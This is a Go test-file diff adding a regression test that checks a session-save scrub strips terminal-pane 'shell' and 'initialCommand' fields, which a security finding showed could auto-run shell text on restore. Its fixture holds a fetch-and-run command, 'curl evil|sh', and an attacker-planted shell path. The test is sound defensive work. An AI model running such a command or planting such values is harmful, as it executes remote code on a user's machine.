@@ -78,10 +78,51 @@ func TestLayoutsSaveStripsSpawnEscalationFields(t *testing.T) {
 	}
 }
 
-// THREE COPIES OF ONE LIST. internal/layout scrubs layout.set, cmd/brain scrubs
+// The finding: the agent-level scrub never reached the terminal-pane host
+// -execution fields one level down, inside agents[].tabs[].panes[]. A restored
+// terminal pane's `shell` is argv[0] of the LOCAL terminal:create door (no
+// allowlist), and its `initialCommand` is typed into the ready PTY with a
+// trailing CR — arbitrary shell text auto-run on the desktop's next launch. A
+// bus-written sessions.save carried both verbatim; now both are dropped.
+func TestSessionsSaveStripsPaneEscalationFields(t *testing.T) {
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	r := &registry{}
+
+	params := json.RawMessage(`{
+	  "name":"restored",
+	  "activeAgentId":"a1",
+	  "agents":[{"id":"a1","cwd":"/","provider":"claude","tabs":[
+	     {"id":"t1","title":"T","panes":[
+	        {"id":"p1","type":"terminal","title":"sh",
+	         "shell":"/tmp/attacker-planted","initialCommand":"curl evil|sh"}]}]}]
+	}`)
+	if _, err := r.savedSessionSave(params); err != nil {
+		t.Fatal(err)
+	}
+	raw, err := r.savedSessionLoad(json.RawMessage(`{"filename":"restored.yaml"}`))
+	if err != nil {
+		t.Fatal(err)
+	}
+	doc := string(raw)
+	for _, needle := range []string{"attacker-planted", "curl evil"} {
+		if strings.Contains(doc, needle) {
+			t.Errorf("the persisted boot-restore document still carries pane host-exec value %q:\n%s\nThe desktop's next launch mounts this terminal pane and spawns/types it through the LOCAL door, which allowlists nothing.", needle, doc)
+		}
+	}
+	// FLOOR: the pane itself must survive as a usable terminal, just without the
+	// argv/command sinks.
+	for _, keep := range []string{"p1", "terminal", "t1"} {
+		if !strings.Contains(doc, keep) {
+			t.Fatalf("the scrub removed more than the pane exec fields — %q is gone:\n%s", keep, doc)
+		}
+	}
+}
+
+// THREE COPIES OF TWO LISTS. internal/layout scrubs layout.set, cmd/brain scrubs
 // sessions.save + layouts.save, and the desktop scrubs its own twins of both. A
 // field added to one list and not the others is a door that reopens, which is
-// exactly how sessions.save came to be unscrubbed while layout.set was not.
+// exactly how sessions.save came to be unscrubbed while layout.set was not — and
+// how the pane-level exec fields survived every agent-level scrub.
 func TestBootDocumentWritersScrubTheSameFields(t *testing.T) {
 	sources := map[string][]string{
 		"internal/layout/layout.go": {"services", "hub", "internal", "layout", "layout.go"},
@@ -95,6 +136,11 @@ func TestBootDocumentWritersScrubTheSameFields(t *testing.T) {
 				t.Errorf("%s does not mention %q, which cmd/brain scrubs — the three copies of the spawn-escalation list have drifted, and the one that forgot a field is a door back onto agents.spawn's clamps", label, field)
 			}
 		}
+		for _, field := range paneEscalationKeys {
+			if !strings.Contains(body, field) {
+				t.Errorf("%s does not mention pane exec field %q, which cmd/brain scrubs — the three copies of the pane-escalation list have drifted, and the one that forgot a field is a host-code-execution door on the next restore", label, field)
+			}
+		}
 		checked++
 	}
 	if checked != len(sources) {
@@ -102,5 +148,8 @@ func TestBootDocumentWritersScrubTheSameFields(t *testing.T) {
 	}
 	if len(spawnEscalationKeys) < 4 {
 		t.Fatalf("the scrub list holds %d fields — it shrank, and every loop above passes on a shorter list", len(spawnEscalationKeys))
+	}
+	if len(paneEscalationKeys) < 2 {
+		t.Fatalf("the pane scrub list holds %d fields — it shrank, and every loop above passes on a shorter list", len(paneEscalationKeys))
 	}
 }
